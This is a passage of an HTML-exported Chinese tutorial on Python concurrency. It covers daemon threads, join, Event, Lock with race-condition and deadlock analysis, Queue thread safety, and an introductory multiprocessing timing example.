<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20027;&#32447;&#31243;&#26159;non-daemon&#32447;&#31243;</span>
<span style="color: #a0522d;">t</span> = threading.Thread(target=foo, daemon=<span style="color: #008b8b;">False</span>)
t.start()
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Main Thread Exits'</span>)
</pre>
</div>


<p>
发现线程t依然执行，主线程已经执行完，但是一直等着线程t。<br>
</p>

<p>
修改为 t = threading.Thread(target=foo, daemon=True) 试一试，结果程序立即结束了，进程根本没有等daemon线程t。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21517;&#31216; &#21547;&#20041;
daemon&#23646;&#24615; &#34920;&#31034;&#32447;&#31243;&#26159;&#21542;&#26159;daemon&#32447;&#31243;&#65292;&#36825;&#20010;&#20540;&#24517;&#39035;&#22312;start()&#20043;&#21069;&#35774;&#32622;&#65292;&#21542;&#21017;&#24341;&#21457;RuntimeError&#24322;&#24120;
<span style="color: #0000ff;">isDaemon</span>() &#26159;&#21542;&#26159;daemon&#32447;&#31243;
setDaemon &#35774;&#32622;&#20026;daemon&#32447;&#31243;&#65292;&#24517;&#39035;&#22312;start&#26041;&#27861;&#20043;&#21069;&#35774;&#32622;
</pre>
</div>

<p>
看一个例子，，看看主线程何时结束daemon线程<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> threading

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(name, timeout):
    time.sleep(timeout)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'{} working'</span>.<span style="color: #483d8b;">format</span>(name))

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20027;&#32447;&#31243; &#26159;non-daemon&#32447;&#31243;</span>
<span style="color: #a0522d;">t1</span> = threading.Thread(target=worker, args=(<span style="color: #8b2252;">'t1'</span>, 5), daemon=<span style="color: #008b8b;">True</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35843;&#25442;5&#21644;10&#30475;&#30475;&#25928;&#26524;</span>
t1.start()
<span style="color: #a0522d;">t2</span> = threading.Thread(target=worker, args=(<span style="color: #8b2252;">'t2'</span>, 10), daemon=<span style="color: #008b8b;">False</span>)
t2.start()
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Main Thread Exits'</span>)
</pre>
</div>

<p>
上例说明，如果还有non-daemon线程在运行，进程不结束，进程也不会杀掉其它所有daemon线程。直到所有non-daemon线程全部运行结束（包括主线程），不管有没有daemon线程，程序退出。<br>
</p>

<p>
<b>总结</b><br>
</p>

<ul class="org-ul">
<li>主线程是non-daemon线程，即daemon = False<br></li>
<li>线程具有一个daemon属性，可以手动设置为True或False，也可以不设置，则取默认值None<br></li>
<li>如果daemon=None，就取当前线程（父线程）的daemon来设置它<br></li>
<li>从主线程创建的所有线程的不设置daemon属性，则默认都是daemon = False，也就是non-daemon线程<br></li>
<li>Python程序在没有活着的non-daemon线程运行时，程序退出，包括non-daemon的主线程。也就是除主线程之外剩下的只能都是daemon线程，主线程才能退出，否则即使是主线程已经执行完，进程也不能结束，只能等待<br></li>
</ul>
</div>
</div>
<div id="outline-container-h:0e8c25b2-c64d-44fa-bd34-c79bbb8b530f" class="outline-5">
<h5 id="h:0e8c25b2-c64d-44fa-bd34-c79bbb8b530f">join方法</h5>
<div class="outline-text-5" id="text-h:0e8c25b2-c64d-44fa-bd34-c79bbb8b530f">
<p>
先看一个简单的例子，看看效果<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> threading

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(name, timeout):
    time.sleep(timeout)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'{} working'</span>.<span style="color: #483d8b;">format</span>(name))

<span style="color: #a0522d;">t1</span> = threading.Thread(target=worker, args=(<span style="color: #8b2252;">'t1'</span>, 3), daemon=<span style="color: #008b8b;">True</span>)
t1.start()
t1.join()<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;join&#65292;&#21462;&#28040;join&#23545;&#27604;&#19968;&#19979;</span>
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Main Thread Exits'</span>)
</pre>
</div>

<p>
使用了join方法后，当前线程阻塞了，daemon线程执行完了，主线程才退出了。<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> threading

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(name, timeout):
    time.sleep(timeout)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'{} working'</span>.<span style="color: #483d8b;">format</span>(name))

<span style="color: #a0522d;">t1</span> = threading.Thread(target=worker, args=(<span style="color: #8b2252;">'t1'</span>, 10), daemon=<span style="color: #008b8b;">True</span>)
t1.start()
t1.join(2) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#38459;&#22622;2&#31186;&#32467;&#26463;</span>
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'~~~~~~~~~~~'</span>)
t1.join(2)
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'~~~~~~~~~~~'</span>)
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Main Thread Exits'</span>)
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">join</span>(<span style="color: #a0522d;">timeout</span>=None)
</pre>
</div>


<ul class="org-ul">
<li>join方法是线程的标准方法之一<br></li>
<li>一个线程中调用另一个线程的join方法，调用者将被阻塞，直到被调用线程终止，或阻塞超时<br></li>
<li>一个线程可以被join多次<br></li>
<li>timeout参数指定调用者等待多久，没有设置超时，就一直等到被调用线程结束<br></li>
<li>调用谁的join方法，就是join谁，就要等谁<br></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:894eb0fc-559d-4fbc-b449-83f217c6c2b1" class="outline-4">
<h4 id="h:894eb0fc-559d-4fbc-b449-83f217c6c2b1">线程同步</h4>
<div class="outline-text-4" id="text-h:894eb0fc-559d-4fbc-b449-83f217c6c2b1">
<p>
概念<br>
线程同步，线程间协同，通过某种技术，让一个线程访问某些数据时，其他线程不能访问这些数据，直到该线程完成对数据的操作。<br>
</p>
</div>
<div id="outline-container-h:a89bd8f4-632a-4022-86d1-ecd88c29fe71" class="outline-5">
<h5 id="h:a89bd8f4-632a-4022-86d1-ecd88c29fe71"><code>Event ***</code></h5>
<div class="outline-text-5" id="text-h:a89bd8f4-632a-4022-86d1-ecd88c29fe71">
<p>
Event事件，是线程间通信机制中最简单的实现，使用一个内部的标记flag，通过flag的True或False的变化来进行操作。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21517;&#31216; &#21547;&#20041;
<span style="color: #483d8b;">set</span>() &#26631;&#35760;&#35774;&#32622;&#20026;True
<span style="color: #0000ff;">clear</span>() &#26631;&#35760;&#35774;&#32622;&#20026;False
<span style="color: #0000ff;">is_set</span>() &#26631;&#35760;&#26159;&#21542;&#20026;True
<span style="color: #483d8b;">wait</span>(<span style="color: #a0522d;">timeout</span>=None) : &#35774;&#32622;&#31561;&#24453;&#26631;&#35760;&#20026;True&#30340;&#26102;&#38271;&#65292;None&#20026;&#26080;&#38480;&#31561;&#24453;&#12290;&#31561;&#21040;&#36820;&#22238;True&#65292;&#26410;&#31561;&#21040;&#36229;&#26102;&#20102;&#36820;&#22238;False
</pre>
</div>

<p>
练习<br>
老板雇佣了一个工人，让他生产杯子，老板一直等着这个工人，直到生产了10个杯子<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#19979;&#38754;&#30340;&#20195;&#30721;&#26159;&#21542;&#33021;&#22815;&#23436;&#25104;&#21151;&#33021;&#65311;</span>
<span style="color: #a020f0;">from</span> threading <span style="color: #a020f0;">import</span> Event, Thread
<span style="color: #a020f0;">import</span> logging
<span style="color: #a020f0;">import</span> time

<span style="color: #a0522d;">FORMAT</span> = <span style="color: #8b2252;">'%(asctime)s %(threadName)s %(thread)s %(message)s'</span>
logging.basicConfig(<span style="color: #483d8b;">format</span>=FORMAT, level=logging.INFO)

<span style="color: #a0522d;">cups</span> = []
<span style="color: #a0522d;">flag</span> = <span style="color: #008b8b;">False</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">boss</span>():
  logging.info(<span style="color: #8b2252;">"I'm boss, waiting for U"</span>)
  <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    time.sleep(1)
    <span style="color: #a020f0;">if</span> flag:
      <span style="color: #a020f0;">break</span>
  logging.info(<span style="color: #8b2252;">'Good Job.'</span>)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(count=10):
  logging.info(<span style="color: #8b2252;">'I am working for U'</span>)
  <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    logging.info(<span style="color: #8b2252;">'make 1 cup'</span>)
    time.sleep(0.5)
    cups.append(1)
    <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(cups) &gt;= count:
      <span style="color: #a0522d;">flag</span> = <span style="color: #008b8b;">True</span>
      <span style="color: #a020f0;">break</span>
  logging.info(<span style="color: #8b2252;">'I finished my job. cups={}'</span>.<span style="color: #483d8b;">format</span>(cups))

<span style="color: #a0522d;">b</span> = Thread(target=boss, name=<span style="color: #8b2252;">'boss'</span>)
<span style="color: #a0522d;">w</span> = Thread(target=worker, name=<span style="color: #8b2252;">'worker'</span>)
b.start()
w.start()
</pre>
</div>

<p>
上面代码基本能够完成，但上面代码问题有：<br>
</p>
<ul class="org-ul">
<li>bug，应该将worker中的flag定义为global就可解决<br></li>
<li>老板一直要不停的查询worker的状态变化<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> threading <span style="color: #a020f0;">import</span> Event, Thread
<span style="color: #a020f0;">import</span> logging
<span style="color: #a020f0;">import</span> time

<span style="color: #a0522d;">FORMAT</span> = <span style="color: #8b2252;">'%(asctime)s %(threadName)s %(thread)s %(message)s'</span>
logging.basicConfig(<span style="color: #483d8b;">format</span>=FORMAT, level=logging.INFO)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">boss</span>(event:Event):
  logging.info(<span style="color: #8b2252;">"I'm boss, waiting for U"</span>)
  event.wait() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#38459;&#22622;&#31561;&#24453;</span>
  logging.info(<span style="color: #8b2252;">'Good Job.'</span>)
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(event:Event, count=10):
  logging.info(<span style="color: #8b2252;">'I am working for U'</span>)
  <span style="color: #a0522d;">cups</span> = []
  <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    logging.info(<span style="color: #8b2252;">'make 1 cup'</span>)
    time.sleep(0.5)
    cups.append(1)
    <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(cups) &gt;= count:
      event.<span style="color: #483d8b;">set</span>()
      <span style="color: #a020f0;">break</span>
  logging.info(<span style="color: #8b2252;">'I finished my job. cups={}'</span>.<span style="color: #483d8b;">format</span>(cups))
<span style="color: #a0522d;">event</span> = Event()
<span style="color: #a0522d;">b</span> = Thread(target=boss, name=<span style="color: #8b2252;">'boss'</span>, args=(event,))
<span style="color: #a0522d;">w</span> = Thread(target=worker, name=<span style="color: #8b2252;">'worker'</span>, args=(event,))
b.start()
w.start()
</pre>
</div>


<p>
<b>总结</b><br>
</p>

<p>
需要使用同一个Event对象的标记flag。<br>
谁wait就是等到flag变为True，或等到超时返回False。<br>
不限制等待者的个数，通知所有等待者。<br>
</p>

<p>
<b>wait的使用</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;&#19978;&#20363;worker&#20013;&#30340; while &#26465;&#20214;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(event:Event, count=10):
    logging.info(<span style="color: #8b2252;">'I am working for U'</span>)
    <span style="color: #a0522d;">cups</span> = []
    <span style="color: #a020f0;">while</span> <span style="color: #a020f0;">not</span> event.wait(0.5): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;wait&#38459;&#22622;&#31561;&#24453;</span>
        logging.info(<span style="color: #8b2252;">'make 1 cup'</span>)
        cups.append(1)
        <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(cups) &gt;= count:
            event.<span style="color: #483d8b;">set</span>()
            <span style="color: #b22222;">#</span><span style="color: #b22222;">break # &#20026;&#20160;&#20040;&#21487;&#20197;&#27880;&#37322;break&#21602;&#65311;</span>
    logging.info(<span style="color: #8b2252;">'I finished my job. cups={}'</span>.<span style="color: #483d8b;">format</span>(cups))
</pre>
</div>
</div>
</div>
<div id="outline-container-h:72f5b3e0-5cde-4644-a027-8715fc1f3cd3" class="outline-5">
<h5 id="h:72f5b3e0-5cde-4644-a027-8715fc1f3cd3"><code>Lock ***</code></h5>
<div class="outline-text-5" id="text-h:72f5b3e0-5cde-4644-a027-8715fc1f3cd3">
<ul class="org-ul">
<li>Lock类是mutex互斥锁<br></li>
<li>一旦一个线程获得锁，其它试图获取锁的线程将被阻塞，只到拥有锁的线程释放锁<br></li>
<li>凡是存在共享资源争抢的地方都可以使用锁，从而保证只有一个使用者可以完全使用这个资源。<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">&#21517;&#31216; &#21547;&#20041;
<span style="color: #0000ff;">acquire</span>(<span style="color: #a0522d;">blocking</span>=True, <span style="color: #a0522d;">timeout</span>=-1)
&#40664;&#35748;&#38459;&#22622;&#65292;&#38459;&#22622;&#21487;&#20197;&#35774;&#32622;&#36229;&#26102;&#26102;&#38388;&#12290;&#38750;&#38459;&#22622;&#26102;&#65292;timeout&#31105;&#27490;&#35774;&#32622;&#12290;
&#25104;&#21151;&#33719;&#21462;&#38145;&#65292;&#36820;&#22238;True&#65292;&#21542;&#21017;&#36820;&#22238;False

<span style="color: #0000ff;">release</span>()
&#37322;&#25918;&#38145;&#12290;&#21487;&#20197;&#20174;&#20219;&#20309;&#32447;&#31243;&#35843;&#29992;&#37322;&#25918;&#12290;
&#24050;&#19978;&#38145;&#30340;&#38145;&#65292;&#20250;&#34987;&#37325;&#32622;&#20026;unlocked
&#26410;&#19978;&#38145;&#30340;&#38145;&#19978;&#35843;&#29992;&#65292;&#25243;RuntimeError&#24322;&#24120;&#12290;
</pre>
</div>

<p>
锁的基本使用<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time

<span style="color: #a0522d;">lock</span> = threading.Lock() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20114;&#26021;mutex</span>

lock.acquire()
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span> * 30)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(l):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'worker start'</span>, threading.current_thread())
    l.acquire()
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'worker done'</span>, threading.current_thread())

<span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(10):
    threading.Thread(target=worker, name=<span style="color: #8b2252;">"w{}"</span>.<span style="color: #483d8b;">format</span>(i),
                     args=(lock,), daemon=<span style="color: #008b8b;">True</span>).start()

<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span> * 30)

<span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    <span style="color: #a0522d;">cmd</span> = <span style="color: #483d8b;">input</span>(<span style="color: #8b2252;">"&gt;&gt;&gt;"</span>)
    <span style="color: #a020f0;">if</span> cmd == <span style="color: #8b2252;">'r'</span>: <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25353;r&#21518;&#26522;&#20030;&#25152;&#26377;&#32447;&#31243;&#30475;&#30475;</span>
        lock.release()
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'released one locker'</span>)
    <span style="color: #a020f0;">elif</span> cmd == <span style="color: #8b2252;">'quit'</span>:
        lock.release()
        <span style="color: #a020f0;">break</span>
    <span style="color: #a020f0;">else</span>:
        <span style="color: #483d8b;">print</span>(threading.<span style="color: #483d8b;">enumerate</span>())
        <span style="color: #483d8b;">print</span>(lock.locked())
</pre>
</div>

<p>
上例可以看出不管在哪一个线程中，只要对一个已经上锁的锁发起阻塞地请求，该线程就会阻塞。<br>
</p>

<p>
<b>练习</b><br>
</p>

<p>
订单要求生产1000个杯子，组织10个工人生产。请忽略老板，关注工人生成杯子<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">from</span> threading <span style="color: #a020f0;">import</span> Thread, Lock
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> logging

<span style="color: #a0522d;">FORMAT</span> = <span style="color: #8b2252;">"%(asctime)s %(threadName)s %(thread)d %(message)s"</span>
logging.basicConfig(<span style="color: #483d8b;">format</span>=FORMAT, level=logging.INFO)

<span style="color: #a0522d;">cups</span> = []

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(count=1000):
    logging.info(<span style="color: #8b2252;">"I'm working"</span>)
    <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
        <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(cups) &gt;= count:
            <span style="color: #a020f0;">break</span>
        time.sleep(0.0001) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20026;&#20102;&#30475;&#20986;&#32447;&#31243;&#20999;&#25442;&#25928;&#26524;&#65292;&#27169;&#25311;&#26479;&#23376;&#21046;&#20316;&#26102;&#38388;</span>
        cups.append(1)
    logging.info(<span style="color: #8b2252;">'I finished my job. cups = {}'</span>.<span style="color: #483d8b;">format</span>(<span style="color: #483d8b;">len</span>(cups)))

<span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1, 11):
    <span style="color: #a0522d;">t</span> = Thread(target=worker, name=<span style="color: #8b2252;">"w{}"</span>.<span style="color: #483d8b;">format</span>(i), args=(1000,))
    t.start()
</pre>
</div>

<p>
从上例的运行结果看出，多线程调度，导致了判断失效，多生产了杯子。<br>
</p>

<p>
如何修改解决这个问题？加锁<br>
</p>

<p>
上例使用锁实现如下：<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">from</span> threading <span style="color: #a020f0;">import</span> Thread, Lock
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> logging

<span style="color: #a0522d;">FORMAT</span> = <span style="color: #8b2252;">"%(asctime)s %(threadName)s %(thread)d %(message)s"</span>
logging.basicConfig(<span style="color: #483d8b;">format</span>=FORMAT, level=logging.INFO)

<span style="color: #a0522d;">cups</span> = []
<span style="color: #a0522d;">lock</span> = Lock() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#38145;</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(count=1000):
  logging.info(<span style="color: #8b2252;">"I'm working"</span>)
  <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    lock.acquire() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#38145;</span>
    <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(cups) &gt;= count:
      <span style="color: #b22222;">#</span><span style="color: #b22222;">lock.release() # 1</span>
      <span style="color: #a020f0;">break</span>
    <span style="color: #b22222;">#</span><span style="color: #b22222;">lock.release()   # 2</span>
    time.sleep(0.0001) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20026;&#20102;&#30475;&#20986;&#32447;&#31243;&#20999;&#25442;&#25928;&#26524;&#65292;&#27169;&#25311;&#26479;&#23376;&#21046;&#20316;&#26102;&#38388;</span>
    cups.append(1)
    lock.release()   <span style="color: #b22222;"># </span><span style="color: #b22222;">3</span>
  logging.info(<span style="color: #8b2252;">'I finished my job. cups = {}'</span>.<span style="color: #483d8b;">format</span>(<span style="color: #483d8b;">len</span>(cups)))

<span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1, 11):
  <span style="color: #a0522d;">t</span> = Thread(target=worker, name=<span style="color: #8b2252;">"w{}"</span>.<span style="color: #483d8b;">format</span>(i), args=(1000,))
  t.start()
</pre>
</div>

<p>
<b>锁分析</b><br>
</p>

<p>
位置2分析<br>
</p>
<ul class="org-ul">
<li>假设某一个瞬间，有一个工作线程A获取了锁，len(cups)正好有999个，然后就释放了锁，可以继续执行下面的语句，生产一个杯子，这地方不阻塞，但是正好杯子也没有生产完。锁释放后，其他线程就可以获得锁，线程B获得了锁，发现len(cups)也是999个，然后释放锁，然后也可以去生产一个杯子。锁释放后，其他的线程也可能获得锁。就说A和B线程都认为是999个，都会生产一个杯子，那么实际上最后一定会超出1000个。<br></li>
<li>假设某个瞬间一个线程获得锁，然后发现杯子到了1000个，没有释放锁就直接break了，由于其他线程还在阻塞等待锁释放，这就成了死锁了。<br></li>
</ul>

<p>
位置3分析<br>
</p>
<ul class="org-ul">
<li>获得锁的线程发现是999，有资格生产杯子，生产一个，释放锁，看似很完美<br></li>
<li>问题在于，获取锁的线程发现杯子有1000个，直接break，没释放锁离开了，死锁了<br></li>
</ul>

<p>
位置1分析<br>
</p>
<ul class="org-ul">
<li>如果线程获得锁，发现是1000，break前释放锁，没问题<br></li>
<li>问题在于，A线程获得锁后，发现小于1000，继续执行，其他线程获得锁全部阻塞。A线程再次执行循环后，自己也阻塞了。死锁了。<br></li>
</ul>

<p>
问题：究竟怎样加锁才正确呢？<br>
要在位置1和位置3同时加release。<br>
</p>

<p>
<b>上下文支持</b><br>
</p>

<p>
锁是典型必须释放的，Python提供了上下文支持。查看Lock类的上下文方法，__enter__方法返回bool表示是否获得锁，__exit__方法中释放锁。<br>
</p>

<p>
由此上例可以修改为<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">from</span> threading <span style="color: #a020f0;">import</span> Thread, Lock
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> logging

<span style="color: #a0522d;">FORMAT</span> = <span style="color: #8b2252;">"%(asctime)s %(threadName)s %(thread)d %(message)s"</span>
logging.basicConfig(<span style="color: #483d8b;">format</span>=FORMAT, level=logging.INFO)

<span style="color: #a0522d;">cups</span> = []
<span style="color: #a0522d;">lock</span> = Lock() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#38145;</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(count=1000):
  logging.info(<span style="color: #8b2252;">"I'm working"</span>)
  <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    <span style="color: #a020f0;">with</span> lock: <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#38145;&#65292;&#31163;&#24320;with&#37322;&#25918;&#38145;</span>
      <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(cups) &gt;= count:
        logging.info(<span style="color: #8b2252;">'leaving'</span>)
        <span style="color: #a020f0;">break</span>
      time.sleep(0.0001) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20026;&#20102;&#30475;&#20986;&#32447;&#31243;&#20999;&#25442;&#25928;&#26524;&#65292;&#27169;&#25311;&#26479;&#23376;&#21046;&#20316;&#26102;&#38388;</span>
      cups.append(1)
      logging.info(lock.locked())
  logging.info(<span style="color: #8b2252;">'I finished my job. cups = {}'</span>.<span style="color: #483d8b;">format</span>(<span style="color: #483d8b;">len</span>(cups)))

<span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1, 11):
  <span style="color: #a0522d;">t</span> = Thread(target=worker, name=<span style="color: #8b2252;">"w{}"</span>.<span style="color: #483d8b;">format</span>(i), args=(1000,))
  t.start()
</pre>
</div>

<p>
感觉一下正确得到结果了吗？感觉到了执行速度了吗？慢了还是快了，为什么？ 比之前少了释放锁操作<br>
</p>

<p>
<b>锁的应用场景</b><br>
</p>

<p>
锁适用于访问和修改同一个共享资源的时候，即读写同一个资源的时候。<br>
</p>

<p>
如果全部都是读取同一个共享资源需要锁吗？<br>
不需要。因为这时可以认为共享资源是不可变的，每一次读取它都是一样的值，所以不用加锁<br>
</p>

<p>
使用锁的注意事项：<br>
</p>
<ul class="org-ul">
<li>少用锁，必要时用锁。使用了锁，多线程访问被锁的资源时，就成了串行，要么排队执行，要么争抢执行<br>
<ul class="org-ul">
<li>举例，高速公路上车并行跑，可是到了省界只开放了一个收费口，过了这个口，车辆依然可以在多车道上一起跑。过收费口的时候，如果排队一辆辆过，加不加锁一样效率相当，但是一旦出现争抢，就必须加锁一辆辆过。注意，不管加不加锁，只要是一辆辆过，效率就下降了。<br></li>
</ul></li>
<li>加锁时间越短越好，不需要就立即释放锁<br></li>
<li>一定要避免死锁<br></li>
</ul>

<p>
不使用锁，有了效率，但是结果是错的。<br>
使用了锁，效率低下，但是结果是对的。<br>
所以，我们是为了效率要错误结果呢？还是为了对的结果，让计算机去计算吧<br>
</p>
</div>
</div>
<div id="outline-container-h:650ef61f-59c0-40d5-8455-310ed5759919" class="outline-5">
<h5 id="h:650ef61f-59c0-40d5-8455-310ed5759919">Queue的线程安全</h5>
<div class="outline-text-5" id="text-h:650ef61f-59c0-40d5-8455-310ed5759919">
<p>
标准库queue模块，提供FIFO的Queue、LIFO的队列、优先队列。<br>
Queue类是线程安全的，适用于同一进程内多线程间安全的交换数据。内部使用了Lock和Condition。<br>
</p>

<p>
特别注意下面的代码在多线程中使用<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> queue

<span style="color: #a0522d;">q</span> = queue.Queue(8)
<span style="color: #a020f0;">if</span> q.qsize() == 7:
  q.put() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19978;&#19979;&#20004;&#21477;&#21487;&#33021;&#34987;&#25171;&#26029;</span>
<span style="color: #a020f0;">if</span> q.qsize() == 1:
  q.get() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26410;&#24517;&#20250;&#25104;&#21151;</span>
</pre>
</div>

<p>
如果不加锁，是不可能获得准确的大小的，因为你刚读取到了一个大小，还没有取走数据，就有可能被其他线程改了。<br>
</p>

<p>
Queue类的size虽然加了锁，但是，依然不能保证立即get、put就能成功，因为读取大小和get、put方法是分开的。<br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:d412ed10-48bd-4a30-ab1c-fe4911facf99" class="outline-4">
<h4 id="h:d412ed10-48bd-4a30-ab1c-fe4911facf99">多进程</h4>
<div class="outline-text-4" id="text-h:d412ed10-48bd-4a30-ab1c-fe4911facf99">
<p>
多线程未必是CPU密集型程序的好的选择。<br>
多进程可以完全独立的进程环境中运行程序，可以较充分地利用多处理器。<br>
但是进程本身的隔离带来的数据不共享也是一个问题。而且线程比进程轻量级。<br>
</p>
</div>
<div id="outline-container-h:d72e4e58-72f2-4425-8708-9b9dfed7bbf3" class="outline-5">
<h5 id="h:d72e4e58-72f2-4425-8708-9b9dfed7bbf3">multiprocessing</h5>
<div class="outline-text-5" id="text-h:d72e4e58-72f2-4425-8708-9b9dfed7bbf3">
<p>
<b>Process类</b><br>
</p>

<p>
Process类遵循了Thread类的API，减少了学习难度。<br>
</p>

<p>
先看一个例子，前面介绍的单线程、多线程比较的例子的多进程版本<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> multiprocessing
<span style="color: #a020f0;">import</span> datetime

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">calc</span>(i):
  <span style="color: #483d8b;">sum</span> = 0
  <span style="color: #a020f0;">for</span> _ <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1000000000): <span style="color: #b22222;"># </span><span style="color: #b22222;">10&#20159;</span>
    <span style="color: #483d8b;">sum</span> += 1
  <span style="color: #a020f0;">return</span> i, <span style="color: #483d8b;">sum</span>

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
  <span style="color: #a0522d;">start</span> = datetime.datetime.now() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27880;&#24847;&#19968;&#23450;&#35201;&#26377;&#36825;&#19968;&#21477;</span>

  <span style="color: #a0522d;">ps</span> = []
  <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(4):
    <span style="color: #a0522d;">p</span> = multiprocessing.Process(target=calc, args=(i,), name=<span style="color: #8b2252;">'calc-{}'</span>.<span style="color: #483d8b;">format</span>(i))
    ps.append(p)
    p.start()
  <span style="color: #a020f0;">for</span> p <span style="color: #a020f0;">in</span> ps:
    p.join()
    <span style="color: #483d8b;">print</span>(p.name, p.exitcode)
  <span style="color: #a0522d;">delta</span> = (datetime.datetime.now() - start).total_seconds()
  <span style="color: #483d8b;">print</span>(delta)
  <span style="color: #a020f0;">for</span> p <span style="color: #a020f0;">in</span> ps:
    <span style="color: #483d8b;">print</span>(p.name, p.exitcode)
  <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'===end===='</span>)
</pre>
</div>


<p>
对于上面这个程序，在同一主机（授课主机）上运行时长的对比<br>
</p>
<ul class="org-ul">
<li>使用单线程、多线程跑了4分钟多<br></li>
<li>多进程用了1分半<br></li>
</ul>

<p>
